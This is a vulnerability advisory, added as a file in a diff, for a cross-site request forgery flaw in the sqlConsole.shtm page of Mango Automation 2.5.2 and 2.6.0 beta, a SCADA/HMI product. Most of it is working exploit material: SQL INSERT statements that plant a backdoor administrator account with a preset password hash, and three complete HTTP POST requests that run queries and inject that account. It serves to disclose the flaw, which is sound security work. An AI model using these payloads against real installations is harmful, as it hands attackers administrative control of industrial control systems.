@@ -1,0 +1,110 @@
+
+Mango Automation 2.6.0 CSRF Arbitrary SQL Query Execution
+
+
+Vendor: Infinite Automation Systems Inc.
+Product web page: http://www.infiniteautomation.com/
+Affected version: 2.5.2 and 2.6.0 beta (build 327)
+
+Summary: Mango Automation is a flexible SCADA, HMI
+And Automation software application that allows you
+to view, log, graph, animate, alarm, and report on
+data from sensors, equipment, PLCs, databases, webpages,
+etc. It is easy, affordable, and open source.
+
+Desc: The application allows users to perform SQL queries
+via HTTP requests without performing any validity checks
+to verify the requests in sqlConsole.shtm page. This can
+be exploited to execute arbitrary SQL commands with administrative
+privileges if a logged-in user visits a malicious web site.
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN) 32/64bit
+           Microsoft Windows 7 Ultimate SP1 (EN) 32/64bit
+           Jetty(9.2.2.v20140723)
+           Java(TM) SE Runtime Environment (build 1.8.0_51-b16)
+           Java HotSpot(TM) Client VM (build 25.51-b03, mixed mode)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5259
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5259.php
+
+
+20.08.2015
+
+--
+
+
+SQL query in version 2.5.2 (pass 123123) with hash injection:
+-------------------------------------------------------------
+INSERT INTO USERS VALUES(1337,'gjoko','YB8YiWZ++uuzO4wSVyg12j8Cf3g=','gjoko@z.sl','','Y','N',1440075860103,'','0','N','','Y');
+1 records(s) updated.
+
+
+SQL query in version 2.6.0 beta build 327 (pass 123123) with hash injection:
+----------------------------------------------------------------------------
+INSERT INTO USERS VALUES(1337,'gjoko','YB8YiWZ++uuzO4wSVyg12j8Cf3g=','gjoko@z.sl','','N',1440075860103,'','0','N','','Y','superadmin');
+1 records(s) updated.
+
+USERS table:
+ID USERNAME PASSWORD EMAIL PHONE DISABLED LASTLOGIN HOMEURL RECEIVEALARMEMAILS RECEIVEOWNAUDITEVENTS TIMEZONE MUTED PERMISSIONS
+
+1.
+
+POST /sqlConsole.shtm HTTP/1.1
+Host: localhost:8080
+Content-Length: 51
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/sqlConsole.shtm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1
+
+sqlString=select+*+from+users%3B&query=Submit+query
+
+
+2. 
+
+POST /sqlConsole.shtm HTTP/1.1
+Host: localhost:8080
+Content-Length: 54
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/sqlConsole.shtm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1
+
+sqlString=select+*+from+users%3B&tables=Get+table+list
+
+
+3. 
+
+
+POST /sqlConsole.shtm HTTP/1.1
+Host: localhost:8080
+Content-Length: 246
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8080/sqlConsole.shtm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: MANGO8080=13208s4v50p7duy7hjzmxetz1
+
+sqlString=INSERT+INTO+USERS+VALUES%289%2C%27gjoko3%27%2C%27YB8YiWZ%2B%2BuuzO4wSVyg12j8Cf3g%3D%27%2C%27gjoko%40z.sl%27%2C%27333222111%27%2C%27Y%27%2C%27N%27%2C1440075860103%2C%27%27%2C%270%27%2C%27N%27%2C%27%27%2C%27Y%27%29%3B&update=Submit+update
